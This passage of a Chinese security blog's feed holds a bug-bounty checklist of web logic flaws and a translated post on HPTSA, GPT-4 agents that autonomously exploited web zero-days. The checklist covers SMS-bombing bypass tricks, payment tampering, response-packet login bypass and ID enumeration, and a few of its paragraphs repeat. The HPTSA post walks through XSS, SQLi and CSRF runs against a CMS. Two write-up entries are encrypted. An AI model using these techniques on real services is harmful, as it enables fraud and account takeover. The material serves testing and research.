以发现有些URL是多个用户都会访问的，而有的URL（或者请求中含有的特定的参数）是各个用户访问时都存在差异的。这类具有差异性的URL即为敏感URL。</p><p>当用户A访问了不在惯常访问URL合集内的URL，且此URL为敏感URL，即可以判定为发生了越权访问。</p><p>7、业务流程乱序<br>7.1、顺序执行缺陷<br>a) 部分网站逻辑可能是先A过程后B过程然后C过程最后D过程</p><p>b) 用户控制着他们给应用程序发送的每一个请求，因此能够按照任何顺序进行访问。于是，用户就从B直接进入了D过程，就绕过了C。如果C是支付过程，那么用户就绕过了支付过程而买到了一件商品。如果C是验证过程，就会绕过验证直接进入网站程序了。</p><p>8、业务接口调用安全<br>8.1、重放攻击<br>在短信、邮件调用业务或生成业务数据环节中(类:短信验证码，邮件验证码，订单生成，评论提交等),对其业务环节进行调用(重放)测试。如果业务经过调用(重放)后被多次生成有效的业务或数据结果。</p><p>a) 恶意注册</p><p>b) 短信</p><p>在测试的过程中，我们发现众多的金融交易平台仅在前端通过JS校验时间来控制短信发送按钮，但后台并未对发送做任何限制，导致可通过重放包的方式大量发送恶意短信</p><p>8.2、内容编辑<br>点击”获取短信验证码”,并抓取数据包内容。通过分析数据包，可以发现参数sendData&#x2F;insrotext的内容有客户端控制，可以修改为攻击者想要发送的内容</p><p>9、时效绕过测试<br>大多有利用的案例发生在验证码以及业务数据的时效范围上，在之前的总结也有人将12306的作为典型，故，单独分类。</p><p>9.1、时间刷新缺陷<br>12306网站的买票业务是每隔5s，票会刷新一次。但是这个时间确实在本地设置的间隔。于是，在控制台就可以将这个时间的关联变量重新设置成1s或者更小，这样刷新的时间就会大幅度缩短(主要更改autoSearchTime本地参数)。</p><p>9.2、时间范围测试<br>针对某些带有时间限制的业务，修改其时间限制范围，例如在某项时间限制范围内查询的业务，修改含有时间明文字段的请求并提交，查看能否绕过时间限制完成业务流程。例如通过更改查询手机网厅的受理记录的month范围，可以突破默认只能查询六个月的记录。</p><p>新设置成1s或者更小，这样刷新的时间就会大幅度缩短(主要更改autoSearchTime本地参数)。</p><p>9.2、时间范围测试<br>针对某些带有时间限制的业务，修改其时间限制范围，例如在某项时间限制范围内查询的业务，修改含有时间明文字段的请求并提交，查看能否绕过时间限制完成业务流程。例如通过更改查询手机网厅的受理记录的month范围，可以突破默认只能查询六个月的记录。</p><h3 id="SRC中的逻辑漏洞总结"><a href="#SRC中的逻辑漏洞总结" class="headerlink" title="SRC中的逻辑漏洞总结"></a>SRC中的逻辑漏洞总结</h3><ol><li><p>注册：</p><ol><li>短信轰炸</li><li>验证码安全问题</li><li>密码爆破</li><li>邮箱轰炸</li></ol></li><li><p>用户任意注册、批量注册</p></li><li><p>用户名枚举</p></li><li><p>XSS（有框的地方就可以尝试插XSS）</p></li><li><p>登录：</p><ol><li>短信轰炸、验证码安全问题、密码爆破、邮箱轰炸</li><li>SQL注入</li><li>撞库</li><li>抓包把password字段修改为空值发送</li><li>认证凭证替换、比如返回的数据包中包含账号，修改账号就能登录到其他账号</li><li>Cookie仿冒</li><li>修改返回包的相关数据，可能会登陆到其他的用户</li></ol></li><li><p>找回密码：</p><ol><li>短信邮箱轰炸、短信邮箱劫持</li><li>重置任意用户账户密码、验证码手机用户未统一验证</li><li>直接跳过验证步骤</li></ol></li><li><p>购买支付、充值（要利用抓包去仔细查看每一个可用的参数）</p><ol><li>交易金额、数量修改、更换支付模块（比如更换支付的模块金额）</li><li>交易信息订单编码&#x2F;导致信息泄露</li><li>整数溢出，int最大值为2147483647，超过最大值</li><li>修改充值账户</li><li>支付绕过</li></ol></li><li><p>抽奖活动</p><ol><li>刷奖品、积分</li><li>并发</li></ol></li><li><p>优惠卷、代金卷</p><ol><li>并发逻辑漏洞（burp批量获取优惠券）</li><li>修改优惠券金额、数量</li></ol></li><li><p>订单信息</p><ol><li>订单信息遍历、泄露</li><li>订单信息泄露导致用户信息泄露</li><li>删出他人订单</li></ol></li><li><p>会员系统</p><ol><li>修改个人信息上传文件，上传带弹窗的html</li><li>如遇上上传xlsx、docx，可能存在XXE，上传恶意的文档盲测</li><li>图片上传也可能遇到imagereagick命令执行，上传恶意图片</li><li>视频上传如果使用ffmpeg&lt;3.2.4（视频按帧分割成图片），上传恶意avi盲测ssrf</li><li>用户横向越权访问、遍历、导致用户信息泄露</li><li>SQL注入、个人简历处存储XSS个人信息注册的名称也可以插入XSS</li></ol></li><li><p>传输过程</p><ol><li>明文传输账户密码</li><li>修改信息处无session&#x2F;token导致csrf</li><li>POST&#x2F;COOKIE注入</li></ol></li><li><p>评论</p><ol><li>POST注入</li><li>存储型XSS</li><li>无session&#x2F;token导致CSRF</li></ol></li><li><p>验证码问题</p><ol><li>万能验证码</li><li>返回包中存在验证码</li><li>删除验证码或者cookie中的值可以爆破账号密码</li></ol></li><li><p>短信轰炸</p><ol><li>一直重放</li><li>删除修改cookie，重放数据包</li><li>遍历参数发送数据包</li><li>手机号后面加空格或者前面加其他的比如+86或者逗号分号等，然后重发数据包</li><li>请求参数修改大小写，或者添加请求参数比如&amp;id&#x3D;1</li><li>一个站的登录处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口</li><li>如果对手机号一天的次数进行了限制，还可以再发一次短信，DO intercept之后修改为成功回显</li></ol></li><li><p>水平越权</p><ol><li>主要登陆后还是修改参数，主要找到多个接口不断测试</li><li>关注网页源代码，有时候会有表单，但被bidden（隐藏标签）给隐藏起来了，可以修改返回包然后尝试获取数据检测</li><li>多个账号，主要分析请求参数</li></ol></li><li><p>数据泄露</p><ol><li>再找回密码处，填写数据后抓包查看返回信息，有可能存在敏感数据返回</li></ol></li><li><p>任意用户密码重置</p><ol><li>目前大部分都是在修改密码处参数修改</li><li>有些是前端验证</li></ol></li></ol><p>支付逻辑漏洞</p><ol><li>边界值问题 : 正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户</li><li>顺序执行缺陷：正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。</li><li>金额直接传输导致篡改：直接对下单的金额进行修改值，这里可以使用fd或者burp抓包</li><li>确定支付之后还可以加入购物车：把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。</li><li>请求重放：购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。</li><li>请求参数干扰：金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。</li><li>订单替换：订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。</li><li>欺诈:需要两个收款人，一个是正常的商家，一个是伪造的商家</li><li>单位替换：产生在paypal类似的国际支付的场景。</li><li>用户替换：在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西</li><li>强制攻击：强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。</li><li>秘钥泄漏：内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。</li><li>函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。</li><li>heart bleed：SSL（安全套接层）协议是使用最为普遍网站加密技术，而OpenSSL则是开源的 SSL 套件，为全球成千上万的web服务器所使用。Web服务器正是通过它来将密钥发送给访客然后在双方的连接之间对信息进行加密。URL中使用 https打头的连接都采用了SSL加密技术。在线购物、网银等活动均采用SSL技术来防止窃密及避免中间人攻击。</li></ol><p>该漏洞被归为缓冲过度读取。缓冲过度读取错误是软件可以读取比应该被允许还多的数据。漏洞让特定版本的openSSL成为无需钥匙即可开启的“废锁”，入侵者每次可以翻检户主的64K信息，只要有足够的耐心和时间，就可以翻检足够多的数据，拼凑出户主的银行密码、私信等敏感数据。产生原因：数据在传输的两端是不加密的。一些数据如果在传输过程中不加密则会泄露个人数据等信息。</p><ol><li>修改返回包的越权<ol><li>修改手机号</li></ol></li></ol><p>一般的逻辑为：认证原手机号-&gt; 填写新手机号-&gt; 提交修改</p><p>如果在下一步操作时，没有校验上一步的认证是否成功时，就会存在逻辑缺陷绕过</p><p>比如在进行第一步认证原手机号时，随意输入验证码，将response包中的相关字段进行修改，比如0改成1，false改成true，即可绕过第一步验证，进入填写新手机号界面，如果第三步提交修改时没有验证第一步的结果，就会造成逻辑漏洞</p><ol><li>登录绕过</li></ol><p>部分网站的身份验证放在了前端，因此只需要将response包中的相关字段进行修改，比如0改成1，false改成true，就可以登录任意用户账号</p><ol><li>水平越权<ol><li>遍历ID</li></ol></li></ol><p>在一些请求中，GET和POST中有明显的ID数字参数（手机号、员工号、账单号、银行卡号、订单号等等），可以尝试进行遍历，如果程序没有对当前权限进行判断，就会存在水平越权问题</p><ol><li>ID替换</li></ol><p>如果程序对用户标识进行了hash或者加密，而无法破解用的什么方式的话，就无法通过遍历ID来获取其它用户的信息了，此时可以尝试注册两个账号，通过替换两个ID加密后的值，判断程序是否对权限进行了验证，如果没有，也会存在越权问题</p><ol><li>垂直越权</li></ol><p>观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> BugBounty </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebSec </tag>
            
            <tag> BugBounty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox_unified解题</title>
      <link href="/2024/11/13/2024-07-28-hackthebox-unified/"/>
      <url>/2024/11/13/2024-07-28-hackthebox-unified/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="5d9b45f2ce3048bfa614ff6380568beb0393c54cc5e5bfef156911ff8f1007ad"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Hackthebox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sec </tag>
            
            <tag> Hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLM与0day安全</title>
      <link href="/2024/11/13/2024-07-28-weixin-passage/"/>
      <url>/2024/11/13/2024-07-28-weixin-passage/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="LLM-代理可以自主利用零日漏洞"><a href="#LLM-代理可以自主利用零日漏洞" class="headerlink" title="LLM 代理可以自主利用零日漏洞"></a>LLM 代理可以自主利用零日漏洞</h1><p>基于大型语言模型 （LLM） 的代理能力越来越强，现在可以解决像<a href="https://swe-agent.com/">解决现实世界的 GitHub 问题</a>一样复杂的任务。随着这些 AI 代理能力的增加，它们用于恶意应用程序（例如网络安全黑客攻击）的潜力也在增加。事实上，我们实验室的研究表明，当给出漏洞的描述（一天设置）时，人工智能代理可以<a href="https://arxiv.org/abs/2404.08144">利用现实世界的漏洞</a>。但是，这些代理在零日设置中表现不佳，在这种设置中，代理不知道该漏洞。我们的工作留下了一个悬而未决的问题：更复杂的代理是否有可能利用零日漏洞？</p><p>在我们的新研究中，我们展示了人工智能代理_团队_可以在事先不知道漏洞的情况下利用零日漏洞。我们开发了一种称为 HPTSA（分层规划和任务特定代理）的多代理技术，该技术将任务分为探索和规划代理、团队经理代理和特定任务专家代理。</p><p>我们创建了一个真实世界的、以 Web 为中心的漏洞基准来测试我们的方法。HPTSA 可以破解我们基准测试中<strong>一半以上的</strong>漏洞，而开源漏洞扫描器为 0%，我们以前的代理为 20%（没有 CVE 描述）。我们的结果表明，像<a href="https://cdn.openai.com/papers/gpt-4-system-card.pdf">最初的 GPT-4 安全评估</a>那样，在聊天机器人设置中测试 LLM 不足以理解 LLM 的能力。</p><p>在博客文章的其余部分，我们将介绍我们的技术、基准和评估。阅读<a href="https://arxiv.org/abs/2406.01637">我们的论文</a>了解更多详情！</p><h1 id="分层规划和特定于任务的代理"><a href="#分层规划和特定于任务的代理" class="headerlink" title="分层规划和特定于任务的代理"></a>分层规划和特定于任务的代理</h1><p>尽管单个 AI 代理非常强大，但它们受到现有 LLM 功能的限制。例如，如果 AI 代理沿着一条路径走（例如，尝试利用 XSS），则代理很难回溯并尝试利用另一个漏洞（例如，CSRF）。此外，正如多镜头学习文献所显示的那样，LLM 在专注于单一任务时表现最好。</p><p>为了解决这些问题，我们创建了 HPTSA。HPTSA 包含三类代理：探索&#x2F;规划代理、团队经理代理和特定于任务的专家代理。</p><p><a href="https://cdn-images-1.readmedium.com/v2/resize:fit:800/0*ILUsKdf3zReT_AJx" class="gallery-item"><img src="https://cdn-images-1.readmedium.com/v2/resize:fit:800/0*ILUsKdf3zReT_AJx"></a></p><p>我们的 HPTSA 代理的架构图。</p><p>探索&#x2F;规划代理探索环境（即网站），以确定在哪些页面上尝试哪些类型的漏洞利用。在确定整体草图后，它会呼叫团队经理代理。团队经理代理负责呼叫我们特定于任务的专家代理。</p><p>我们的任务特定代理专注于单一类型的漏洞（例如，仅 XSS）和后备通用 Web 黑客代理。我们设计了带有提示模板的特定任务代理，以专注于特定形式的漏洞，并使其能够以文档的形式访问特定于漏洞的信息。</p><p>团队经理选择要运行的特定代理，并从专家代理那里收集和汇总跟踪。然后，它可以使用此信息来通知我们特定于任务的代理的进一步运行。</p><h1 id="真实世界漏洞的基准"><a href="#真实世界漏洞的基准" class="headerlink" title="真实世界漏洞的基准"></a>真实世界漏洞的基准</h1><p>对于我们的基准测试，我们专注于现实世界的 Web 漏洞。在为我们的基准选择漏洞时，我们有几个标准：1） 它们是在 GPT-4 的知识截止日期之后发布的，2） 它们可以通过开源代码复制，以及 3） 它们的严重性中等或更高。</p><p>我们根据论文中概述的标准收集了 15 个漏洞。这些漏洞涵盖类型（例如，XSS、SQLi）、严重性（中等到严重）和应用程序类型（例如，从开源票务软件到会计软件）。</p><p>漏洞的一个重要区别是漏洞的类别和漏洞的特定实例。例如，<a href="https://ieeexplore.ieee.org/abstract/document/6120802">至少自 2011</a> 年以来，服务器端请求伪造 （SSRF） 就被称为一类漏洞。然而，2021 年（10 年后）发生的有史以来最大的黑客攻击之一 Microsoft 现在是一家市值数万亿美元的公司，每年<a href="https://news.microsoft.com/stories/cloud-security/">在计算机安全方面投资约 10 亿美元</a>，它<a href="https://www.upguard.com/blog/cve-2021-26855">使用了 SSRF。</a></p><p>因此，找到零日漏洞的特定_实例_至关重要。</p><h1 id="HPTSA可以自主利用零日漏洞"><a href="#HPTSA可以自主利用零日漏洞" class="headerlink" title="HPTSA可以自主利用零日漏洞"></a>HPTSA可以自主利用零日漏洞</h1><p>为了测试 HPTSA，我们使用 GPT-4 作为基础代理，并将其部署为 6 个特定于任务的专家代理。我们之前的研究表明，开源模型在黑客任务方面表现不佳，因此我们专注于 GPT-4。取而代之的是，我们将 HPTSA 与单个 GPT-4 代理和带有漏洞描述的 GPT-4 代理（0D 代理）进行了比较。我们进一步比较了开源漏洞扫描器 ZAP 和 MetaSploit。</p><p>正如我们所展示的，HPTSA 可以利用 15 个漏洞中的 8 个，而 0D 代理的 15 个漏洞中有 11 个。相比之下，单个 GPT-4 代理只能入侵 15 个漏洞中的 3 个。最后，ZAP 和 MetaSploit 都能够利用 15 个漏洞中的 0 个。</p><p><a href="https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*yYCtEKzHU11cJ5Eh_KnSVw.png" class="gallery-item"><img src="https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*yYCtEKzHU11cJ5Eh_KnSVw.png"></a></p><p>不同代理和开源漏洞扫描器的黑客攻击漏洞成功率。</p><p>我们的结果表明，HPTSA能够自主利用零日漏洞进行黑客攻击。</p><h1 id="个案研究"><a href="#个案研究" class="headerlink" title="个案研究"></a>个案研究</h1><p>为了了解我们的代理可以完成的任务类型，我们演练了一个黑客攻击 flusity-CMS 开源软件的案例研究。我们研究了 flusity-CMS 中的两个漏洞：CVE-2024-24524 和 CVE-2024-27757。管理面板中的添加菜单组件容易受到 CSRF 攻击，用户以管理员身份登录的用户可能仅通过单击 HTML 文件就在不知不觉中在 CMS 中创建新菜单 （CVE-2024–24524）。此外，通过 CMS 中的画廊插件创建画廊时，存在 XSS 漏洞 （CVE-2024–27757）。</p><p>在此网站上的HPTSA的一个痕迹上，它采取了以下步骤：</p><ol><li>主管代理调用了 XSS 代理，其中包含查找 XSS 漏洞的通用说明： - 运行 1：代理使用给定的凭据成功登录。但是，它没有导航到端点以探索潜在的 XSS 攻击，而是停下来并提供了一份可能追踪的途径列表。 - 运行 2：代理使用给定的凭据成功登录并导航 &#x2F;admin.php。在那里，它去创建一个帖子，在那里它注入了一个 XSS 有效载荷。然后，它保存并将帖子发布到主页，利用了 XSS 漏洞（但不是 CVE 中提到的 XSS 漏洞）。 - 运行 3：代理使用给定的凭据登录并导航到 。在那里，它探索了可用的菜单和设置，并创建了一个带有 XSS 有效载荷的帖子。但是，它还导航到 addOn 菜单，在那里它在库 addOn 中构建了一个 XSS 有效载荷，成功利用了 CVE-2024–27757。<code>/admin.php``/admin.php</code></li><li>然后，执行称为SQL代理的监督代理，再次带有通用的指令来浏览网站。 - 运行 1：代理尝试在登录页面上进行 SQL 注入攻击，该攻击确实奏效。 - 运行2：Agent尝试对登录页面进行SQL注入攻击，但失败。然后，它使用正确的凭据登录并访问 .它尝试在创建后页面上进行 SQL 注入，但未获得任何结果。 - 运行 3：代理尝试在登录页面上进行 SQL 注入攻击，但失败，然后使用给定的凭据登录。然后，它访问了端点，并在 post 和语言搜索功能中尝试了 SQL 有效负载，但失败了。<code>/admin.php``/admin.php</code></li><li>最后，调用了 CSRF 代理。但是，它的任务是针对 上提供的各种菜单和操作。 - 运行 1：代理成功登录并导航到菜单创建端点。在那里，它采取了一些步骤来自行创建一个菜单。然后，它验证是否已创建新菜单，并构建了一个 CSRF 有效负载，该有效负载利用 CVE-2024–24524 重新创建这些步骤。 - 运行 2：座席成功登录并导航到帖子创建页面。然后，它创建了一个帖子并制作了一个 CSRF 有效负载，如果点击该有效负载，它应该使管理员创建一个帖子，但它不起作用。 - 运行 3：代理登录并导航到帖子创建页面，再次尝试制作有效负载以创建新帖子。但是，有效载荷再次不起作用。<code>/admin.php</code></li></ol><p>从这些案例研究中，我们可以观察到HPTSA的几个特征。首先，它可以成功地在特定任务代理的执行跟踪中合成信息。例如，从第一次到第二次 XSS 运行，它都专注于特定页面。此外，根据 SQL 跟踪，它确定 CSRF 代理应专注于 &#x2F;admin.php 端点。这种行为与专家网络安全红队员的行为没有什么不同。</p><p>我们还注意到，特定于任务的代理现在可以专门关注漏洞，而无需回溯，因为回溯属于主管代理的职权范围。这解决了我们之前的代理中的一个问题，即单个代理在回溯过程中会变得混乱。</p><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>正如我们在过去几个月中所展示的那样，人工智能代理具有很强的能力来执行网络安全黑客攻击。重要的是，我们的进步不需要新的模型：我们在过去两项研究中测试了相同的基础模型。唯一的变化是我们如何使用 GPT-4！</p><p>如前所述，我们的结果表明，在聊天机器人设置中测试 LLM，就像<a href="https://cdn.openai.com/papers/gpt-4-system-card.pdf">最初的 GPT-4 安全评估</a>一样，不足以理解 LLM 的能力。我们希望未来的工作重点放在前沿车型的全面安全评估上。</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> NetSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Weixin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-GreenHorn</title>
      <link href="/2024/11/13/2024-07-28-hackthebox-GreenHorn/"/>
      <url>/2024/11/13/2024-07-28-hackthebox-GreenHorn/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="ac4acc138c652de8297534d83f3b1958bd4ed81029dfba787bfb09b904128367">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f259686e6fc3261c47ce3bb093cbeb378c458eb48b8d151dbf53f6228b441fe19b63280e8a5ed915d9fd4757cd0dab4757841f3a2f69c21409841d86a4fc610590f5048eb6bda464bfd405240afe189417929be396063f9cf0f3e5597a4bff3a4434d63a283f8449730c8fa7d463c3cb6ab288be2f13278e14fc57b3b0c71309035168dba6ca2f5c036edbaba358e79cde0b509f57bd8fa43b47c212c3d90904f938e06075bbdd458be563837884626682bef5dce01e2243ff51dddf446342ffd399f4a9ca68b6efeaa4223ae6fb2bdec6f5cc35a5bc17d33adcb52b2c0cea1fd94c509bb62233704edca2ffa5c4cddd5b8c7f02a88316e2497af36f87693e54dab64e34cd178112ede0f85a3ba624df3cc3f15f4ee1297fc00d2390bedf72cb77472b1367353c8a16e309d84e92359ff38769feede2eb71b5b47b45554f377ae4f8e9a5c0058ac8737c99bf0f478e5b67cdff12d7c1656cd91b58adf2baa392d045f1874b47af2f554242f0ee2ac10681eb906a943e415935a0f554b0e0be730c44adaab9ee1877babaebf173cc3e48a9f3fbd52b8ef9e145b8c9dcbd058d2b65c6b1347a501b28a4a1e0a2f9076530ccb6d660bcd396c9aec92d9ca1bade70fe55e1e807a7881365d06a9b6ef94defefcb8f1300dc8f58c4ba8ad0abc2e58abcf49a9b4b9bce93489632dbcc655183ad6a200520040c6a106e360d8097a43c56ece7eebed0aacc6c204a4e452d2ada2cdb0d7065f50e30778f973660fd5c2d015e8a7ec09d86a7da007455675068a3d60c43b75bd281ddc76b3d65c4f412f8ca64f9a635654bb75cdf4a94016e1de54e0f032bd9c9ea1b699fdbe93c05520d2636b7db6d04627170a86da7e3ba5658b3a9e010ac62e9641d8dae4b66cad63a6e1bb8d4267aaf61712471a888280995fa6a3ee73b8e67e3ee69b5ec4cdb2331ba6b5ecbad23a6cbbad8a0cd019ee8fe64fc7659246fe9c990dbe9882b29fbff5166dc6b52c80d6dbb1f6620a4f3f22b0b7aab1b11a87e66aa4cf2dd0d1a0bda3fcc0fed27f79c827fa655e486437ab40babb5fe8f639f4e943cd217c0737e28f7ad6059f85cfa70bbcb19c695004c6d65c8a13e607301af6f7a781f257c2cabece0da2f0e6e91932aa528ba1a13ab60e265acb2b17e7457d556f9f041bbeb0fb59c276c672461e1b2f2e2c64409a71d05addd6be580bfeb7af13d2e77c6e8def3afa686c91a4347d455b2fbc52c265af6fd11e71f4dfc074cf33bfb2aef69faa04e756ac9dcf49885a3d516862bf5e0d8a673b23ab49a72771ec6ae972171558a9c1226f219fdf7958b54724e0b4361738638273f60ff35d2025a2eaf5c4935af25cbda0fadac5767dfe6afaec62cc7c69dcb3b545b757f23a5818c12525bba84a1ff326eed385b2326ed247927f9c047caea5c3e24749cee13a41333d60e4c1354ca61367ece53b3b078fada905f4add234c2d18c3524b0b14ebd3c54894769d212f2854f50cea8cb1db1b9cb5af7bdbad7ad531115ba98322d22031d535cae86cadadbeae63e336fe54e85863daa8f4b4d358f2cc98ec850b906ffab9373faf9c7150311db4ae794bd1fab5bfbab01ee371d696c305ea50b2ec1af673846c71da68eed1745119f795c4c4ff6048d0e96623e6305696eb4695ba8ff09c6362c7f3e23a727482217637c8b2342d6e13fc1843b4ed1ef6f44cdfc26dc9cbdabeeaaaf1a34621406e6034b173e1f8357c201eb6d25ab6437d3909a7f85641de461b9dff85bbe0b75c1aabf2201f7c98a4bb957796e023f30a49700153f58d7f39b9057a4d21a53cd7e5eef578d7e521da2566f17016fcdbaeae388d87f4294da4b863a872d5a5eaf8d751391b637271b19fc9d1692776b19eb7fa8cc4e5072bb8c5ec0253ca2b69b0b533bc08d0b552a2ab1bae71338bf2302e4cc6b394540c02e7cdc58cd109ad70291f5056c3ed2ab5f31497e8f81b075b17878263ae5d78bfb6243b9d172c0d04700ff0ce313d3ea75a5531334105bc74d56f28ec19f2c9edcb367d6798f701167d8a45e30eb5ffcdfdd6aad56b3db9a619926abb354439622e3744bf17d2c156a287cd4050ddf2e6463cb7494f26899a1236e0d2e1b6e93f4066055f03928df3a2dee3724ce2e5f82a1603bf383abf617fc2ecfe3544576ed18793377051188572c04fbd3d8e851ea4fbb8c1a65e2eb466c3182141dbbbe739251e2ff3699519af79b35a292fd44c23622f8edc2bc06c512b2d0b5a743d35146c00f6556c018610fea12a90f335f6b0622ccc4a4c1374b081be7efb69626ca35a2297de61747a9cc6256dacc5a05c50ea24ef1f162e8614bce5887405e4989442929a7b2bc60bf16122e4d6dc2de3efa08ef52002e0146a057cf2d119e34c1de68544f6cb12fdd7d4247542b45833ca200c41ce2a3e9de117e3e7cc21caac52ca4c1bbb992ff353c4cb6bf5038376d941c761373ae42d7f5cd3a02ab2e05d1ba2cec06dd1bf3ba2c62c0503bcf371466686f42a4902638c6ead6bd25f3338d9d032b5b52250700bb017d3f1f5390ff0d040a77e60280fbc6cc029989ee88f27d81746edcf6e48aeb34267ee4476fed70756d3d9e5defc525d317f9cda35a6c13fb4b9da6e4354eeb85f0b704afe316db3003292e40b4d6c5c695f02b887ed214501b4f5ac810bba108db00311f8961f4ee0fc36bb2ad32e4f54d6d8cb9d1c5b075fe8299131b99f557d3bc2269e806be888ce51c1ad3f9123586d3de72abc7c872c9252b0e82a1dd0931b36a5891a5f1b7818c569fb7df5037ba976af7f0dd1803bc0989f50971a80614ee89d1dbb6f3827974b00444f98d41ccd74523faf569c55903c79bcae400779bef56704abacfd002b8f8bd75ef78f122612b46100529b2d11d9d16e86871d80d2be02079a0d2c8005c36af357fb621fcfd82e1096db77d261e917e249c0d8836a0967896f788b48179dbb09c8b8f523102e2dd672b03a5a227545a0d8b93defb09164321f45be75be7b96a7df14c8567c490d81ca4e942fa71ad0cd82f21dc3f3566350e6cbd2141a649b325a6da3ca487906862e5d91aa034a64c36af61e21eda817fe8ee390e47f73a70ff7a419bf6781c51e20a88e6ea76068d44d4fb279351c4e805b648fd3972426601f2fe2060bbae130bfb5065efba2a664dfe680f3d79f629efe7f6c147026c9c28cc38bbbfcc7e3931360590d47944efe533343b82c9d588ff60363e8957269097f767122024c0f357158c5d3258b3c734e7a91e4aefcc1e95af5f6c4294949c4649003c07ca70db22ad3a17b27edd8c42ac28281d68ca29b1c603121844f4e6777fe2bcf27fc9a97ce64f7ba71dff475271f803a7c0fb192055d2d5fec6eb019e7f23a67f37d9d5bf31118d38d7b42616af13471b7340ff1e5aed074f4e0b6c609d90f6b0560155926a88210658eb449d8159609148be0b830884f8fc72f6c8f2ca4f555972b96a9c037d79b31ad6ab9e1e4a32bc577b0ddb094a8d7f7c42ba350d56f789f81758c85272e8e1c6b1ba696052e20212c235b92f56b245058a3a75dfe06283f5605d7c590a0d4dc5e99ad70911a9e96fef0b5f26ca796dffdfc1833f62b3275067bd5b592d2f3f14e407cba389b2c4fea7e20f2d24afdec15fcd13422cca36d91c9e4cb803764641e3ecae537312645db8155a431d74e391a30398c9ab8d4a820ff3f532bc6ab185cdf3ed3e6598a62fa7dbef9c0149b8094964e873d277036d6065f87b149c2cd000ec9f3946011c2bd6e07b36b98ab5346d8d9f6e5bc1ebe332a5239ee507a48a4268abfb8ed0ef27b6856671b51f2acae958d5bdb7238af5d45aa219e5383d05fd847d86adf8c4bfcd849f161b5b1a6e811e9f928a3d9145237d0d458c533a04aa576304d1e483c0e66999dcb2a2105a87659b0821b31caad8ce6cb616a6ebcb4f2eab80f147ad0954eb43abad3f50f9ae28a92dc001930e43880d2f4f807f500053182c5864a79860b86fb42adcdd3058049549366202ce35b99028ca9fc91392c15a4da2d3851aa6554651dc2697c3ecbb05d20e98a829873b36bf0f40ad89685d41d